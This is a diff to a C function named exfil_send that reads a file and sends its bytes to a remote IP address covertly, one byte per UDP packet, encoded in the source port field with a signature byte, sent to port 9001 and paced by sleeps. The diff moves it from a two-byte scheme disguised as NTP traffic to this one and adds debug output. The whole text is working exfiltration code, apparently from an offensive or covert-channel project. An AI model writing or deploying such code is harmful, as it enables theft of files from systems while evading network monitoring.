@@ -205,10 +205,13 @@ void exfil_send(uint32 ipaddr, char *path)
 
 	file = open_file(path, FALSE);
 
+	printf("Starting Exfil: %s\n", path);
+
 	while ((buflen = fread(buffer, 1, MAX_LEN, file)) > 0)
 	{
 		char *trans;
-		
+		int tot_len;
+
 		// Pad non-even sequences with a space ...
 		if (buflen % 2 != 0)
 		{
@@ -217,35 +220,41 @@ void exfil_send(uint32 ipaddr, char *path)
 			++buflen;
 		}
 
+		tot_len = buflen + 1;
+
 		trans = buildTransmission(buffer, &buflen, XFL_TYP);
 
-		for (int i = 0; i < buflen; i += 8)
+		printf("Data: %s\n", buffer);
+
+		for (int i = 0; i < tot_len; i += 8)
 		{
 			char frame[FRAM_SZ];
-//			char * enc;
-			char * ptr;
+//			char *enc;
+			char *ptr;
 			int fram_len;
-			ushort src_port = 0;
-			ushort dst_port = 0;
+			uint16 src_port = 0;
+			uint16 dst_port = 0;
 
 			ptr = trans + i;
 
-			fram_len = (buflen - i > 8) ? FRAM_SZ : buflen - i;
+			fram_len = (tot_len - i > 8) ? FRAM_SZ : tot_len - i;
 
 			memcpy(frame, ptr, fram_len);
 
-			//enc = encrypt(SEKRET, frame, 2);
-			
-			src_port = (frame[0] << 8) + frame[1];
-			dst_port = PORT_NTP;
+//			enc = encrypt(SEKRET, frame, FRAM_SZ);
 
-			//free(enc);
-			
-			_send(ipaddr, src_port, dst_port, CHAN_UDP);
-			
-			usleep(SLEEP_TIME);
+			for (int j = 0; j < FRAM_SZ; ++j)
+			{
+				uint8 byte = frame[j];
+				src_port = 0xFF00 & SIGNTR << 8;
+				src_port += byte;
+				dst_port = 9001;
+
+				usleep(SLEEP_TIME);
+				_send(ipaddr, src_port, dst_port, channel);
+			}
+//			free(enc);
 		}
-		
 
 //		for (int i = 0; i < buflen;)
 //		{
